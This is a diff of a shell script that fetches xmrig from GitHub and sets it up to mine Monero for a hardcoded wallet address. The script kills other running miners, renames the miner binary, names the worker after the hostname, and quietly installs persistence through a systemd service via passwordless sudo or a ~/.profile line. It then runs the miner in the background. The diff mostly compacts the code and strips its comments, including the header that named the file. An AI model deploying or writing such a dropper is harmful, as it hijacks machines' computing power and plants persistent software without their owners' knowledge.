@@ -1,5 +1,4 @@
 #!/bin/sh
-# mfeederr.sh — MoneroOcean miner setup (strict POSIX sh, minimal output)
 set -u
 
 WALLET="86d9KS12AnJTAVCbQcsw7G5e18ETxxVgAYyzM5d1yxxtAQXAAeAUoD6Sithghh7ookT3GNnkDX276GCRyNpPn9M4Nv2M44B"
@@ -25,29 +24,16 @@ fetch() {
   else return 1; fi
 }
 
-# ---------- preflight ----------
-if [ -z "${HOME:-}" ]; then
-  fail "HOME not set"
-fi
-if [ ! -d "$HOME" ]; then
-  fail "HOME dir missing: $HOME"
-fi
-
-if ! have curl; then
-  if ! have wget; then
-    fail "no curl and no wget"
-  fi
-fi
+if [ -z "${HOME:-}" ]; then fail "HOME not set"; fi
+if [ ! -d "$HOME" ]; then fail "HOME dir missing"; fi
+if ! have curl; then if ! have wget; then fail "no curl/wget"; fi; fi
 
 WBASE="${WALLET%%.*}"
 WLEN="${#WBASE}"
 if [ "$WLEN" != "95" ]; then
-  if [ "$WLEN" != "106" ]; then
-    fail "bad wallet length $WLEN"
-  fi
+  if [ "$WLEN" != "106" ]; then fail "bad wallet length $WLEN"; fi
 fi
 
-# ---------- port ----------
 CPU_THREADS=1
 if have nproc; then
   T=$(nproc 2>/dev/null)
@@ -67,9 +53,7 @@ power2() {
     return
   fi
   P=1
-  while [ "$P" -lt "$N" ]; do
-    P=$(( P * 2 ))
-  done
+  while [ "$P" -lt "$N" ]; do P=$(( P * 2 )); done
   echo "$P"
 }
 
@@ -77,19 +61,13 @@ PORT=$(( EXP * 30 ))
 if [ "$PORT" -eq 0 ]; then PORT=1; fi
 P2=$(power2 "$PORT")
 PORT=$(( 10000 + P2 ))
-if [ "$PORT" -lt 10001 ]; then
-  fail "port out of range: $PORT"
-fi
-if [ "$PORT" -gt 18192 ]; then
-  fail "port out of range: $PORT"
-fi
+if [ "$PORT" -lt 10001 ]; then fail "port out of range: $PORT"; fi
+if [ "$PORT" -gt 18192 ]; then fail "port out of range: $PORT"; fi
 
-# ---------- clean ----------
 pkill -f "$BIN_NAME" 2>/dev/null
 pkill -f "xmrig" 2>/dev/null
 rm -rf "$DIR" || fail "cannot remove $DIR"
 
-# ---------- download ----------
 mkdir -p "$DIR" || fail "cannot create $DIR"
 if ! download "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" /tmp/xmrig.tar.gz; then
   fail "download xmrig.tar.gz"
@@ -99,41 +77,26 @@ if ! tar xf /tmp/xmrig.tar.gz -C "$DIR" 2>/dev/null; then
 fi
 rm -f /tmp/xmrig.tar.gz
 
-# ---------- rename ----------
-if [ ! -f "$DIR/xmrig" ]; then
-  fail "xmrig binary missing after unpack"
-fi
+if [ ! -f "$DIR/xmrig" ]; then fail "xmrig binary missing after unpack"; fi
 mv "$DIR/xmrig" "$BIN" || fail "rename failed"
 chmod +x "$BIN" || fail "chmod failed"
 
 if ! "$BIN" --help >/dev/null 2>&1; then
   REL=$(fetch "https://github.com/xmrig/xmrig/releases/latest")
   URL="https://github.com$(echo "$REL" | grep -o '"[^"]*xenial-x64.tar.gz"' | cut -d'"' -f2)"
-  if [ -z "$URL" ]; then
-    fail "advanced binary broken, no stock fallback URL"
-  fi
-  if ! download "$URL" /tmp/xmrig.tar.gz; then
-    fail "stock xmrig download failed"
-  fi
-  if ! tar xf /tmp/xmrig.tar.gz -C "$DIR" --strip=1 2>/dev/null; then
-    fail "stock xmrig unpack failed"
-  fi
+  if [ -z "$URL" ]; then fail "no stock fallback URL"; fi
+  if ! download "$URL" /tmp/xmrig.tar.gz; then fail "stock download failed"; fi
+  if ! tar xf /tmp/xmrig.tar.gz -C "$DIR" --strip=1 2>/dev/null; then fail "stock unpack failed"; fi
   rm -f /tmp/xmrig.tar.gz
-  if [ -f "$DIR/xmrig" ]; then
-    mv -f "$DIR/xmrig" "$BIN"
-  fi
-  if ! "$BIN" --help >/dev/null 2>&1; then
-    fail "stock xmrig also broken"
-  fi
+  if [ -f "$DIR/xmrig" ]; then mv -f "$DIR/xmrig" "$BIN"; fi
+  if ! "$BIN" --help >/dev/null 2>&1; then fail "stock xmrig also broken"; fi
 fi
 
-# ---------- worker id ----------
 PASS=$(hostname 2>/dev/null | cut -f1 -d"." | sed -E 's/[^a-zA-Z0-9-]+/_/g')
 if [ -z "$PASS" ]; then PASS="kdfeederr"; fi
 if [ "$PASS" = "localhost" ]; then PASS="kdfeederr"; fi
 if [ -n "$EMAIL" ]; then PASS="$PASS:$EMAIL"; fi
 
-# ---------- config ----------
 cat > "$CFG" <<EOF
 {
   "api": { "id": null, "worker-id": null },
@@ -178,23 +141,16 @@ cat > "$CFG" <<EOF
   "watch": true
 }
 EOF
-if [ ! -s "$CFG" ]; then
-  fail "config write failed"
-fi
+if [ ! -s "$CFG" ]; then fail "config write failed"; fi
 
 cp "$CFG" "$CFGB" || fail "background config copy failed"
-sed -i 's/"background": *false/"background": true/' "$CFGB" || fail "background config edit failed"
+sed -i 's/"background": *false/"background": true/' "$CFGB" || fail "background edit failed"
 
 if have python3; then
-  if ! python3 -m json.tool "$CFG" >/dev/null 2>&1; then
-    fail "config.json invalid"
-  fi
-  if ! python3 -m json.tool "$CFGB" >/dev/null 2>&1; then
-    fail "config_background.json invalid"
-  fi
+  if ! python3 -m json.tool "$CFG" >/dev/null 2>&1; then fail "config.json invalid"; fi
+  if ! python3 -m json.tool "$CFGB" >/dev/null 2>&1; then fail "config_background.json invalid"; fi
 fi
 
-# ---------- miner.sh ----------
 cat > "$DIR/miner.sh" <<EOF
 #!/bin/sh
 if ! pidof $BIN_NAME >/dev/null; then
@@ -205,9 +161,7 @@ fi
 EOF
 chmod +x "$DIR/miner.sh" || fail "miner.sh chmod failed"
 
-# ---------- persistence (best effort) ----------
 PERSIST=0
-
 if have sudo; then
   if sudo -n true 2>/dev/null; then
     if have systemctl; then
@@ -223,26 +177,12 @@ CPUWeight=1
 WantedBy=multi-user.target
 EOF
       M1=0
-      if sudo -n mv /tmp/moneroocean_miner.service /etc/systemd/system/ 2>/dev/null; then
-        M1=1
-      fi
+      if sudo -n mv /tmp/moneroocean_miner.service /etc/systemd/system/ 2>/dev/null; then M1=1; fi
       M2=0
-      if [ "$M1" = "1" ]; then
-        if sudo -n systemctl daemon-reload 2>/dev/null; then
-          M2=1
-        fi
-      fi
+      if [ "$M1" = "1" ]; then if sudo -n systemctl daemon-reload 2>/dev/null; then M2=1; fi; fi
       M3=0
-      if [ "$M2" = "1" ]; then
-        if sudo -n systemctl enable --now moneroocean_miner.service 2>/dev/null; then
-          M3=1
-        fi
-      fi
-      if [ "$M3" = "1" ]; then
-        PERSIST=1
-      else
-        rm -f /tmp/moneroocean_miner.service
-      fi
+      if [ "$M2" = "1" ]; then if sudo -n systemctl enable --now moneroocean_miner.service 2>/dev/null; then M3=1; fi; fi
+      if [ "$M3" = "1" ]; then PERSIST=1; else rm -f /tmp/moneroocean_miner.service; fi
     fi
   fi
 fi
@@ -252,24 +192,15 @@ if [ "$PERSIST" = "0" ]; then
   if grep -q "moneroocean/miner.sh" "$HOME/.profile" 2>/dev/null; then
     PERSIST=1
   else
-    if echo "$LINE" >> "$HOME/.profile" 2>/dev/null; then
-      PERSIST=1
-    fi
+    if echo "$LINE" >> "$HOME/.profile" 2>/dev/null; then PERSIST=1; fi
   fi
 fi
 
-# ---------- start now ----------
 nohup "$BIN" --config="$CFGB" >/dev/null 2>&1 &
 sleep 2
 
-if ! pgrep -f "$BIN_NAME" >/dev/null; then
-  fail "miner did not stay up (see $DIR/xmrig.log)"
-fi
+if ! pgrep -f "$BIN_NAME" >/dev/null; then fail "miner did not stay up (see $DIR/xmrig.log)"; fi
 
 PIDS=$(pgrep -f "$BIN_NAME" | tr '\n' ' ')
-if [ "$PERSIST" = "1" ]; then
-  PST="yes"
-else
-  PST="no"
-fi
+if [ "$PERSIST" = "1" ]; then PST="yes"; else PST="no"; fi
 echo "SUCCESS: pid=$PIDS port=$PORT persist=$PST"
